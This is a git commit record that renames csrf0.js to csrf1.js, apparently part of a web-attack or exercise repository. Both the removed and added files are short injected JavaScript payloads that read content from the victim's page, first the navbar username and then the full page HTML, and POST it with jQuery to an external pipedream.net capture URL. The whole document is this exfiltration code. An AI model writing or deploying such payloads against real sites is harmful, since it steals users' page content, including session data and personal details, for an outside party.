c018ae50952b3c01b20049071cace2d774e58711
Théophile Dano <theo.dano@gmail.com>
2020-04-22 15:20:36 +0200

    Update and rename csrf0.js to csrf1.js

--- csrf0.js
+++
@@ -1,4 +0,0 @@
-const user = document.getElementsByClassName('navbar-text')[0].innerHTML;
-const url = 'https://enriez9578hb8.x.pipedream.net/';
-jQuery.post(url, user);
-console.log(user);
---
+++ csrf1.js
@@ -0,0 +1,4 @@
+const doc = document.documentElement.innerHTML;
+const url = 'https://enriez9578hb8.x.pipedream.net/';
+jQuery.post(url, doc);
+console.log(doc);
